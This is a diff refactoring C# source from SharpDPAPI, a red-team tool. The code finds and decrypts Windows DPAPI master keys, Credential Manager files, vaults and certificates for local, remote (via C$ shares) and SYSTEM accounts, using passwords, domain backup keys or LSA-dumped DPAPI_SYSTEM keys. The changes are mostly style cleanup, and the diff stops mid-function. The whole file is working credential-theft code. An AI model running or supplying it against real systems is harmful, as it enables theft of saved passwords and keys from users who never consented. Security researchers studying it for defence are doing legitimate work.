@@ -1,8 +1,6 @@
 ﻿using System;
-using System.Collections;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Xml;
@@ -15,8 +13,8 @@ namespace SharpDPAPI
         {
             // triage all *user* masterkeys we can find, decrypting if the backupkey is supplied
 
-            Dictionary<string, string> mappings = new Dictionary<string, string>();
-            bool canAccess = false;
+            var mappings = new Dictionary<string, string>();
+            var canAccess = false;
 
             if (!String.IsNullOrEmpty(computerName))
             {
@@ -33,85 +31,77 @@ namespace SharpDPAPI
             {
                 // if elevated, triage ALL reachable masterkeys
 
-                string userFolder = "";
-
-                if (!String.IsNullOrEmpty(computerName))
-                {
-                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
-                }
-                else
-                {
-                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
-                }
+                var userFolder = !String.IsNullOrEmpty(computerName) ?
+                    $"\\\\{computerName}\\C$\\Users\\" : 
+                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
 
                 userDirs = Directory.GetDirectories(userFolder);
             }
             else
             {
                 // otherwise we're only triaging the current user's path
-                userDirs = new string[] { System.Environment.GetEnvironmentVariable("USERPROFILE") };
+                userDirs = new string[] { Environment.GetEnvironmentVariable("USERPROFILE") };
             }
 
-            foreach (string dir in userDirs)
+            foreach (var dir in userDirs)
             {
-                string[] parts = dir.Split('\\');
-                string userName = parts[parts.Length - 1];
-                if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
+                if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
+                    continue;
+
+                var userDPAPIBasePath = $"{dir}\\AppData\\Roaming\\Microsoft\\Protect\\";
+                if (!Directory.Exists(userDPAPIBasePath))
+                    continue;
+
+                var directories = Directory.GetDirectories(userDPAPIBasePath);
+                foreach (var directory in directories)
                 {
-                    string userDPAPIBasePath = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Protect\\", dir);
-                    if (System.IO.Directory.Exists(userDPAPIBasePath))
+                    var files = Directory.GetFiles(directory);
+                    var isDomain = false;
+                    byte[] hmacBytes = null;
+
+                    foreach (var file in files)
                     {
-                        string[] directories = Directory.GetDirectories(userDPAPIBasePath);
-                        foreach (string directory in directories)
+                        // if the BK-<NETBIOSDOMAINNAME> file exists, assume this is a domain user.
+                        if (Regex.IsMatch(file, @".*\\BK-[0-9A-Za-z]+"))
                         {
-                            string[] files = Directory.GetFiles(directory);
-                            bool isDomain = false;
-                            byte[] hmacbytes = null;
+                            isDomain = true; // means use the NTLM of the user password instead of the SHA1
+                        }
+                    }
 
-                            foreach (string file in files)
-                            {
-                                // if the BK-<NETBIOSDOMAINNAME> file exists, assume this is a domain user.
-                                if (Regex.IsMatch(file, @".*\\BK-[0-9A-Za-z]+"))
-                                {
-                                    isDomain = true; // means use the NTLM of the user password instead of the SHA1
-                                }
-                            }
+                    if (!String.IsNullOrEmpty(password))
+                    {
+                        hmacBytes = Dpapi.CalculateKeys(password, directory, isDomain);
+                    }
 
+                    foreach (var file in files)
+                    {
+                        if (!Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}")) 
+                            continue;
+
+                        if (show)
+                        {
+                            Console.WriteLine("[*] Found MasterKey : {0}", file);
+                        }
+
+                        var masterKeyBytes = File.ReadAllBytes(file);
+                        try
+                        {
+                            KeyValuePair<string, string> plaintextMasterKey;
                             if (!String.IsNullOrEmpty(password))
                             {
-                                hmacbytes = Dpapi.CalculateKeys(password, directory, isDomain);
+                                plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masterKeyBytes, hmacBytes);
+                                mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
                             }
-
-                            foreach (string file in files)
+                            else
                             {
-                                if (Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
-                                {
-                                    string fileName = System.IO.Path.GetFileName(file);
-                                    if (show)
-                                    {
-                                        Console.WriteLine("[*] Found MasterKey : {0}", file);
-                                    }
-
-                                    byte[] masteyKeyBytes = File.ReadAllBytes(file);
-                                    try
-                                    {
-                                        if(!String.IsNullOrEmpty(password))
-                                        {
-                                            Dictionary<string, string> mapping = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, hmacbytes);
-                                            mapping.ToList().ForEach(x => mappings.Add(x.Key, x.Value));
-                                        }
-                                        else
-                                        {
-                                            Dictionary<string, string> mapping = Dpapi.DecryptMasterKey(masteyKeyBytes, backupKeyBytes);
-                                            mapping.ToList().ForEach(x => mappings.Add(x.Key, x.Value));
-                                        }
-                                    }
-                                    catch (Exception e)
-                                    {
-                                        Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
-                                    }
-                                }
+                                plaintextMasterKey = Dpapi.DecryptMasterKey(masterKeyBytes, backupKeyBytes);
                             }
+
+                            mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                         }
                     }
                 }
@@ -126,7 +116,7 @@ namespace SharpDPAPI
                 else
                 {
                     Console.WriteLine("\n[*] User master key cache:\r\n");
-                    foreach (KeyValuePair<string, string> kvp in mappings)
+                    foreach (var kvp in mappings)
                     {
                         Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                     }
@@ -142,74 +132,75 @@ namespace SharpDPAPI
         {
             // retrieve the DPAPI_SYSTEM key and use it to decrypt any SYSTEM DPAPI masterkeys
 
-            Dictionary<string, string> mappings = new Dictionary<string, string>();
+            var mappings = new Dictionary<string, string>();
 
             if (Helpers.IsHighIntegrity())
             {
                 // get the system and user DPAPI backup keys, showing the machine DPAPI keys
                 //  { machine , user }
 
-                List<byte[]> keys = LSADump.GetDPAPIKeys(true);
+                var keys = LSADump.GetDPAPIKeys(true);
                 Helpers.GetSystem();
-                string systemFolder = String.Format("{0}\\Windows\\System32\\Microsoft\\Protect\\", Environment.GetEnvironmentVariable("SystemDrive"));
+                var systemFolder =
+                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\System32\\Microsoft\\Protect\\";
 
-                string[] systemDirs = Directory.GetDirectories(systemFolder);
+                var systemDirs = Directory.GetDirectories(systemFolder);
 
-                foreach (string directory in systemDirs)
+                foreach (var directory in systemDirs)
                 {
-                    string[] machineFiles = Directory.GetFiles(directory);
-                    string[] userFiles = new string[0];
+                    var machineFiles = Directory.GetFiles(directory);
+                    var userFiles = new string[0];
 
-                    if (Directory.Exists(String.Format("{0}\\User\\", directory)))
+                    if (Directory.Exists($"{directory}\\User\\"))
                     {
-                        userFiles = Directory.GetFiles(String.Format("{0}\\User\\", directory));
+                        userFiles = Directory.GetFiles($"{directory}\\User\\");
                     }
 
-                    foreach (string file in machineFiles)
+                    foreach (var file in machineFiles)
                     {
-                        if (Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}")) //Changed regex to only match files starting with the id
-                        {
-                            string fileName = System.IO.Path.GetFileName(file);
-                            if (show)
-                            {
-                                Console.WriteLine("[*] Found SYSTEM system MasterKey : {0}", file);
-                            }
+                        if (!Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
+                            continue;
 
-                            byte[] masteyKeyBytes = File.ReadAllBytes(file);
-                            try
-                            {
-                                // use the "machine" DPAPI key
-                                Dictionary<string, string> mapping = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[0]);
-                                mapping.ToList().ForEach(x => mappings.Add(x.Key, x.Value));
-                            }
-                            catch (Exception e)
-                            {
-                                Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
-                            }
+                        var fileName = Path.GetFileName(file);
+                        if (show)
+                        {
+                            Console.WriteLine("[*] Found SYSTEM system MasterKey : {0}", file);
+                        }
+
+                        var masteyKeyBytes = File.ReadAllBytes(file);
+                        try
+                        {
+                            // use the "machine" DPAPI key
+                            var plaintextMasterkey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[0]);
+                            mappings.Add(plaintextMasterkey.Key, plaintextMasterkey.Value);
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                         }
                     }
 
-                    foreach (string file in userFiles)
+                    foreach (var file in userFiles)
                     {
-                        if (Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
-                        {
-                            string fileName = System.IO.Path.GetFileName(file);
-                            if (show)
-                            {
-                                Console.WriteLine("[*] Found SYSTEM user MasterKey : {0}", file);
-                            }
+                        if (!Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
+                            continue;
 
-                            byte[] masteyKeyBytes = File.ReadAllBytes(file);
-                            try
-                            {
-                                // use the "user" DPAPI key
-                                Dictionary<string, string> mapping = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[1]);
-                                mapping.ToList().ForEach(x => mappings.Add(x.Key, x.Value));
-                            }
-                            catch (Exception e)
-                            {
-                                Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
-                            }
+                        var fileName = Path.GetFileName(file);
+                        if (show)
+                        {
+                            Console.WriteLine("[*] Found SYSTEM user MasterKey : {0}", file);
+                        }
+
+                        var masteyKeyBytes = File.ReadAllBytes(file);
+                        try
+                        {
+                            // use the "user" DPAPI key
+                            var plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[1]);
+                            mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                         }
                     }
                 }
@@ -229,7 +220,7 @@ namespace SharpDPAPI
             if (!String.IsNullOrEmpty(computerName))
             {
                 // if we're triaging a remote computer, check connectivity first
-                bool canAccess = Helpers.TestRemote(computerName);
+                var canAccess = Helpers.TestRemote(computerName);
                 if (!canAccess)
                 {
                     return;
@@ -240,28 +231,30 @@ namespace SharpDPAPI
             {
                 Console.WriteLine("[*] Triaging Credentials for ALL users\r\n");
 
-                string userFolder = "";
-                if (!String.IsNullOrEmpty(computerName))
-                {
-                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
-                }
-                else
-                {
-                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
-                }
+                var userFolder = !String.IsNullOrEmpty(computerName) ? 
+                    $"\\\\{computerName}\\C$\\Users\\" : 
+                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
 
-                string[] dirs = Directory.GetDirectories(userFolder);
+                var dirs = Directory.GetDirectories(userFolder);
 
-                foreach (string dir in dirs)
+                foreach (var dir in dirs)
                 {
-                    string[] parts = dir.Split('\\');
-                    string userName = parts[parts.Length - 1];
-                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
+                    var parts = dir.Split('\\');
+                    var userName = parts[parts.Length - 1];
+                    
+                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")) 
+                        continue;
+
+                    var credentialFilePaths = new string[]
                     {
-                        string userCredFilePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", dir);
-                        TriageCredFolder(userCredFilePath, MasterKeys);
-                        string userCredFilePath2 = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Credentials\\", dir);
-                        TriageCredFolder(userCredFilePath2, MasterKeys);
+                        $"{dir}\\AppData\\Local\\Microsoft\\Credentials\\",
+                        $"{dir}\\AppData\\Roaming\\Microsoft\\Credentials\\"
+                    };
+
+                    foreach (var path in credentialFilePaths)
+                    {
+                        if(Directory.Exists(path))
+                            TriageCredFolder(path, MasterKeys);
                     }
                 }
             }
@@ -269,10 +262,18 @@ namespace SharpDPAPI
             {
                 // otherwise just triage the current user's credential folder
                 Console.WriteLine("[*] Triaging Credentials for current user\r\n");
-                string userCredFilePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-                TriageCredFolder(userCredFilePath, MasterKeys);
-                string userCredFilePath2 = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Credentials\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-                TriageCredFolder(userCredFilePath2, MasterKeys);
+
+                var credentialFilePaths = new string[]
+                {
+                    $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Local\\Microsoft\\Credentials\\",
+                    $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Roaming\\Microsoft\\Credentials\\"
+                };
+
+                foreach (var path in credentialFilePaths)
+                {
+                    if (Directory.Exists(path))
+                        TriageCredFolder(path, MasterKeys);
+                }
             }
         }
 
@@ -283,7 +284,7 @@ namespace SharpDPAPI
             if (!String.IsNullOrEmpty(computerName))
             {
                 // if we're triaging a remote computer, check connectivity first
-                bool canAccess = Helpers.TestRemote(computerName);
+                var canAccess = Helpers.TestRemote(computerName);
                 if (!canAccess)
                 {
                     return;
@@ -294,42 +295,37 @@ namespace SharpDPAPI
             {
                 Console.WriteLine("[*] Triaging Vaults for ALL users\r\n");
 
-                string userFolder = "";
-                if (!String.IsNullOrEmpty(computerName))
-                {
-                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
-                }
-                else
-                {
-                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
-                }
+                var userFolder = "";
+                userFolder = !String.IsNullOrEmpty(computerName) ? 
+                    $"\\\\{computerName}\\C$\\Users\\" : 
+                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
 
-                string[] dirs = Directory.GetDirectories(userFolder);
+                var dirs = Directory.GetDirectories(userFolder);
 
-                foreach (string dir in dirs)
+                foreach (var dir in dirs)
                 {
-                    string[] parts = dir.Split('\\');
-                    string userName = parts[parts.Length - 1];
-                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
+                    var parts = dir.Split('\\');
+                    var userName = parts[parts.Length - 1];
+                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")) 
+                        continue;
+
+                    string[] folderLocations =
                     {
-                        string[] folderLocations =
-                        {
-                            String.Format("{0}\\AppData\\Local\\Microsoft\\Vault\\", dir),
-                            String.Format("{0}\\AppData\\Roaming\\Microsoft\\Vault\\", dir)
-                        };
+                        $"{dir}\\AppData\\Local\\Microsoft\\Vault\\",
+                        $"{dir}\\AppData\\Roaming\\Microsoft\\Vault\\"
+                    };
 
-                        foreach (string location in folderLocations)
+                    foreach (var location in folderLocations)
+                    {
+                        if (!Directory.Exists(location)) 
+                            continue;
+
+                        var vaultDirs = Directory.GetDirectories(location);
+                        foreach (var vaultDir in vaultDirs)
                         {
-                            if (Directory.Exists(location))
+                            if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                             {
-                                string[] vaultDirs = Directory.GetDirectories(location);
-                                foreach (string vaultDir in vaultDirs)
-                                {
-                                    if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
-                                    {
-                                        TriageVaultFolder(vaultDir, MasterKeys);
-                                    }
-                                }
+                                TriageVaultFolder(vaultDir, MasterKeys);
                             }
                         }
                     }
@@ -339,26 +335,19 @@ namespace SharpDPAPI
             {
                 Console.WriteLine("[*] Triaging Vaults for the current user\r\n");
 
-                string vaultPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Vault\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-
-                if (Directory.Exists(vaultPath))
+                var vaultPaths = new string[]
                 {
-                    string[] vaultDirs = Directory.GetDirectories(vaultPath);
-                    foreach (string vaultDir in vaultDirs)
-                    {
-                        if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
-                        {
-                            TriageVaultFolder(vaultDir, MasterKeys);
-                        }
-                    }
-                }
+                    $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Local\\Microsoft\\Vault\\",
+                    $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Roaming\\Microsoft\\Vault\\"
+                };
 
-                string vaultPath2 = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Vault\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-
-                if (Directory.Exists(vaultPath2))
+                foreach (var vaultPath in vaultPaths)
                 {
-                    string[] vaultDirs = Directory.GetDirectories(vaultPath2);
-                    foreach (string vaultDir in vaultDirs)
+                    if (!Directory.Exists(vaultPath)) 
+                        continue;
+
+                    var vaultDirs = Directory.GetDirectories(vaultPath);
+                    foreach (var vaultDir in vaultDirs)
                     {
                         if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                         {
@@ -380,16 +369,19 @@ namespace SharpDPAPI
                 // all the SYSTEM Credential file locations
                 string[] folderLocations =
                 {
-                    String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot")),
-                    String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot")),
-                    String.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot")),
-                    String.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot")),
-                    String.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot")),
-                    String.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot"))
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials",
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials",
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials",
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials",
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials",
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials"
                 };
 
-                foreach (string location in folderLocations)
+                foreach (var location in folderLocations)
                 {
+                    if (!Directory.Exists(location))
+                        continue; 
+                    
                     TriageCredFolder(location, MasterKeys);
                 }
             }
@@ -409,25 +401,25 @@ namespace SharpDPAPI
 
                 string[] folderLocations =
                 {
-                    String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot")),
-                    String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot")),
-                    String.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot")),
-                    String.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot")),
-                    String.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot")),
-                    String.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot"))
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault",
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Vault",
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Vault",
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Vault",
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Vault",
+                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Vault"
                 };
 
-                foreach (string location in folderLocations)
+                foreach (var location in folderLocations)
                 {
-                    if (Directory.Exists(location))
+                    if (!Directory.Exists(location))
+                        continue;
+
+                    var vaultDirs = Directory.GetDirectories(location);
+                    foreach (var vaultDir in vaultDirs)
                     {
-                        string[] vaultDirs = Directory.GetDirectories(location);
-                        foreach (string vaultDir in vaultDirs)
+                        if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                         {
-                            if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
-                            {
-                                TriageVaultFolder(vaultDir, MasterKeys);
-                            }
+                            TriageVaultFolder(vaultDir, MasterKeys);
                         }
                     }
                 }
@@ -443,42 +435,40 @@ namespace SharpDPAPI
             // takes a Vault folder, extracts the AES 128/256 keys from Policy.vpol, and uses these
             //  to decrypt any .vcrd vault credentials
 
-            string policyFilePath = String.Format("{0}\\Policy.vpol", folder);
-            if (File.Exists(policyFilePath))
+            var policyFilePath = $"{folder}\\Policy.vpol";
+            if (!File.Exists(policyFilePath))
+                return;
+            Console.WriteLine("\r\n[*] Triaging Vault folder: {0}", folder);
+
+            var policyBytes = File.ReadAllBytes(policyFilePath);
+
+            // first try to get vault keys from the Policy.vpol
+            var keys = Dpapi.DescribePolicy(policyBytes, MasterKeys);
+
+            // make sure we have keys returned
+            if (keys.Count <= 0) 
+                return;
+
+            var vaultCredFiles = Directory.GetFiles(folder);
+            if ((vaultCredFiles == null) || (vaultCredFiles.Length == 0)) 
+                return;
+
+            foreach (var vaultCredFile in vaultCredFiles)
             {
-                Console.WriteLine("\r\n[*] Triaging Vault folder: {0}", folder);
+                var fileName = Path.GetFileName(vaultCredFile);
+                            
+                if (!fileName.EndsWith("vcrd")) 
+                    continue;
 
-                byte[] policyBytes = File.ReadAllBytes(policyFilePath);
-
-                // first try to get vault keys from the Policy.vpol
-                ArrayList keys = Dpapi.DescribePolicy(policyBytes, MasterKeys);
-
-                if (keys.Count > 0)
+                try
                 {
-                    // make sure we have keys returned
-
-                    string[] vaultCredFiles = Directory.GetFiles(folder);
-                    if ((vaultCredFiles != null) && (vaultCredFiles.Length != 0))
-                    {
-                        foreach (string vaultCredFile in vaultCredFiles)
-                        {
-                            string fileName = System.IO.Path.GetFileName(vaultCredFile);
-                            if (fileName.EndsWith("vcrd"))
-                            {
-                                byte[] vaultCredBytes = File.ReadAllBytes(vaultCredFile);
-
-                                try
-                                {
-                                    // describe the vault credential file using the Policy credentials
-                                    Dpapi.DescribeVaultCred(vaultCredBytes, keys);
-                                }
-                                catch (Exception e)
-                                {
-                                    Console.WriteLine("[X] Error triaging {0} : {1}", vaultCredFile, e.Message);
-                                }
-                            }
-                        }
-                    }
+                    var vaultCredBytes = File.ReadAllBytes(vaultCredFile);
+                    // describe the vault credential file using the Policy credentials
+                    Dpapi.DescribeVaultCred(vaultCredBytes, keys);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("[X] Error triaging {0} : {1}", vaultCredFile, e.Message);
                 }
             }
         }
@@ -486,44 +476,30 @@ namespace SharpDPAPI
         public static void TriageCredFolder(string folder, Dictionary<string, string> MasterKeys)
         {
             // triage a specific credential folder
+            var systemFiles = Directory.GetFiles(folder);
+            if (systemFiles.Length == 0) 
+                return;
+            
+            Console.WriteLine("\r\nFolder       : {0}\r\n", folder);
 
-            if (System.IO.Directory.Exists(folder))
+            foreach (var file in systemFiles)
             {
-                string[] systemFiles = Directory.GetFiles(folder);
-                if ((systemFiles != null) && (systemFiles.Length != 0))
+                try
                 {
-                    Console.WriteLine("\r\nFolder       : {0}\r\n", folder);
-
-                    foreach (string file in systemFiles)
-                    {
-                        try
-                        {
-                            TriageCredFile(file, MasterKeys);
-                        }
-                        catch (Exception e)
-                        {
-                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
-                        }
-                    }
+                    TriageCredFile(file, MasterKeys);
                 }
-                else
+                catch (Exception e)
                 {
-                    // Console.WriteLine("\r\n[X] Folder '{0}' doesn't contain files!", folder);
+                    Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                 }
-            }
-            else
-            {
-                // Console.WriteLine("\r\n[X] Folder '{0}' doesn't currently exist!", folder);
             }
         }
 
         public static void TriageCredFile(string credFilePath, Dictionary<string, string> MasterKeys)
         {
-            // triage a specific credential file
-
-            string fileName = System.IO.Path.GetFileName(credFilePath);
+            var fileName = Path.GetFileName(credFilePath);
             Console.WriteLine("  CredFile           : {0}\r\n", fileName);
-            byte[] credentialArray = File.ReadAllBytes(credFilePath);
+            var credentialArray = File.ReadAllBytes(credFilePath);
 
             // describe and possibly parse the credential blob
             try
@@ -542,11 +518,11 @@ namespace SharpDPAPI
             // triage a certificate file
             try
             {
-                Dictionary<string, Tuple<string, string>> certDictionary = new Dictionary<string, Tuple<string, string>>();
-                string fileName = System.IO.Path.GetFileName(certFilePath);
+                var certDictionary = new Dictionary<string, Tuple<string, string>>();
+                var fileName = Path.GetFileName(certFilePath);
                 Console.WriteLine("  Certificate file           : {0}\r\n", fileName);
 
-                byte[] certificateArray = File.ReadAllBytes(certFilePath);
+                var certificateArray = File.ReadAllBytes(certFilePath);
                 try
                 {
                     certDictionary.Add(fileName, Dpapi.DescribeCertificate(certificateArray, MasterKeys));
@@ -573,39 +549,145 @@ namespace SharpDPAPI
         public static void TriageCertFolder(string folder, Dictionary<string, string> MasterKeys, bool machine = false)
         {
             // triage a specific certificate folder
-            Dictionary<string, Tuple<string, string>> certDictionary = new Dictionary<string, Tuple<string, string>>();
-            if (System.IO.Directory.Exists(folder))
-            {
-                string[] systemFiles = Directory.GetFiles(folder);
-                if ((systemFiles != null) && (systemFiles.Length != 0))
-                {
-                    Console.WriteLine("\r\nFolder       : {0}\r\n", folder);
+            var certDictionary = new Dictionary<string, Tuple<string, string>>();
+            if (!Directory.Exists(folder))
+                return;
 
-                    foreach (string file in systemFiles)
+            var systemFiles = Directory.GetFiles(folder);
+            if ((systemFiles.Length != 0))
+            {
+                Console.WriteLine("\r\nFolder       : {0}\r\n", folder);
+
+                foreach (var file in systemFiles)
+                {
+                    if (Regex.IsMatch(file,
+                        @"[0-9A-Fa-f]{32}[_][0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}")
+                    )
                     {
-                        if (Regex.IsMatch(file,
-                            @"[0-9A-Fa-f]{32}[_][0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}")
-                        )
+                        var fileName = Path.GetFileName(file);
+                        Console.WriteLine("\r\nCertificate file           : {0}\r\n", fileName);
+                        var certificateArray = File.ReadAllBytes(file);
+                        try
                         {
-                            string fileName = System.IO.Path.GetFileName(file);
-                            Console.WriteLine("\r\nCertificate file           : {0}\r\n", fileName);
-                            byte[] certificateArray = File.ReadAllBytes(file);
-                            try
-                            {
-                                certDictionary.Add(fileName, Dpapi.DescribeCertificate(certificateArray, MasterKeys,machine));
-                            }
-                            catch (Exception e)
-                            {
-                                Console.WriteLine("[X] Error triaging {0} : {1}", fileName, e.Message);
-                            }
+                            certDictionary.Add(fileName, Dpapi.DescribeCertificate(certificateArray, MasterKeys, machine));
+                        }
